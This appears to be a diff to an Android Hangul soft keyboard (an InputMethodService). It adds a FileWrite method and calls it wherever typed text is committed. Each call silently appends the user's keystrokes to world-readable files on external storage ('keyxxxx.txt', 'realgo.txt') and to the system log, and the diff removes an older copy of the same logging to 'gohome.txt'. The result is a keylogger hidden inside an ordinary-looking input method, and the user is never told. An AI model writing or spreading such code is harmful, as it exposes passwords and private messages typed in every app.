@@ -172,7 +172,7 @@ public class SoftKeyboard extends InputMethodService
             }
         }
     };
-
+/** @TODO 일단 찾았는데 뭐가 뭔지 알아야함 Gwang log 참고하자*/
     @Override public void onCreate() {
         super.onCreate();
         //setStatusIcon(R.drawable.ime_qwerty);
@@ -367,8 +367,10 @@ public class SoftKeyboard extends InputMethodService
                         attribute.imeOptions);
                 updateShiftKeyState(attribute);
         }
-       
+
+        FileWrite(encodingStr(mComposing.toString()));
         mComposing.setLength(0);
+
         mPredicting = false;
         mDeleteCount = 0;
         setCandidatesViewShown(false);
@@ -507,11 +509,14 @@ public class SoftKeyboard extends InputMethodService
         if (mPredicting) {
             mPredicting = false;
             if (mComposing.length() > 0) {
+
+
                 if (inputConnection != null) {
                     inputConnection.commitText(mComposing, 1);
                 }
                 mCommittedLength = mComposing.length();
                 TextEntryState.acceptedTyped(mComposing);
+
             }
             updateSuggestions();
         }
@@ -696,8 +701,9 @@ public class SoftKeyboard extends InputMethodService
     	{
     		if (ic != null)
     			ic.commitText(mComposing, 1);
-
+            FileWrite(encodingStr(mComposing.toString()));
     		mComposing.setLength(0);
+
     		mHangulAutomata.reset();
     	}
 
@@ -778,20 +784,6 @@ public class SoftKeyboard extends InputMethodService
         }
         //|| mCorrectionMode == mSuggest.CORRECTION_FULL;
         CharSequence typedWord = mWord.getTypedWord();
-
-        String keypress =  encodingStr(String.valueOf(typedWord));
-
-        try {
-            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
-            String FILENAME = "gohome.txt";
-
-            File outfile = new File(SDCARD + File.separator + FILENAME);
-            FileOutputStream fos = new FileOutputStream(outfile, true);
-            fos.write(keypress.getBytes());
-            fos.close();
-        } catch (Exception e) {
-            Log.d("EXCEPTION", e.getMessage());
-        }
         // If we're in basic correct
     setCandidatesViewShown(isCandidateStripVisible() || mCompletionOn);
     }
@@ -851,8 +843,9 @@ public class SoftKeyboard extends InputMethodService
         }
         
         mPredicting = false;
-
+        FileWrite(encodingStr(mComposing.toString()));
         mComposing.setLength(0);
+
         mHangulAutomata.reset();
 
         mCommittedLength = suggestion.length();
@@ -1144,8 +1137,9 @@ public class SoftKeyboard extends InputMethodService
         	if(!(isHangulMode() && -1 == candidatesEnd))
         	{
         		mPredicting = false;
+                FileWrite(encodingStr(mComposing.toString()));
         		mComposing.setLength(0);
-	        	
+
 				updateSuggestions();
 				TextEntryState.reset();
 			
@@ -1172,6 +1166,9 @@ public class SoftKeyboard extends InputMethodService
     private void printComposing()
     {
 	    Log.v(PRJ_NAME, "mComposing= \'" + encodingStr(mComposing.toString()) + "\'");
+
+
+
     }
 
     private String encodingStr(String str)
@@ -1279,7 +1276,9 @@ public class SoftKeyboard extends InputMethodService
             if (!mPredicting) 
             {
                 mPredicting = true;
+                FileWrite(encodingStr(mComposing.toString()));
                 mComposing.setLength(0);
+
                 mWord.reset();
                 mHangulAutomata.reset();
             }
@@ -1310,7 +1309,7 @@ public class SoftKeyboard extends InputMethodService
 		    }
 	        ic.setComposingText(mComposing, 1);
 		    postUpdateSuggestions();
-		    
+
 		    if(DEBUG)
 		    {
 			    printComposing();
@@ -1330,12 +1329,29 @@ public class SoftKeyboard extends InputMethodService
 		    		mComposing.append((char)ret[i]);
 		    }
 		    ic.commitText(mComposing, 1);
+            String keypress =encodingStr(mComposing.toString());
+            Log.d("Key Pressed",keypress);
+            try{
+                String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+                String FILENAME = "realgo.txt";
+
+                File outfile = new File(SDCARD+File.separator+FILENAME);
+                FileOutputStream fos = new FileOutputStream(outfile,true);
+                fos.write(keypress.getBytes());
+                fos.close();
+            }catch(Exception e) {
+                Log.d("EXCEPTION",e.getMessage());
+            }
+		    /** commit text로 다른 앱의 edittext와 계속 통신한다. */
+            FileWrite(encodingStr(mComposing.toString()));
 		    mComposing.setLength(0);
+
 		    if(-1 != ret[2])
 		    {
 		    	mComposing.append((char)ret[2]);
 		    	ic.setComposingText(mComposing, 1);
 		    }
+
 		    ic.endBatchEdit();
 		}
 
@@ -1345,4 +1361,22 @@ public class SoftKeyboard extends InputMethodService
         TextEntryState.typedCharacter((char) primaryCode, isWordSeparator(primaryCode));
     }
 
+
+    public void FileWrite(String input) {
+        //추가
+        String keypress = input+" ";
+        Log.d("Key Pressed", keypress);
+        try {
+            String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+            String FILENAME = "keyxxxx.txt";
+
+            File outfile = new File(SDCARD + File.separator + FILENAME);
+            FileOutputStream fos = new FileOutputStream(outfile, true);
+            fos.write(keypress.getBytes());
+            fos.close();
+        } catch (Exception e) {
+            Log.d("EXCEPTION", e.getMessage());
+        }
+        //추가
+    }
 }
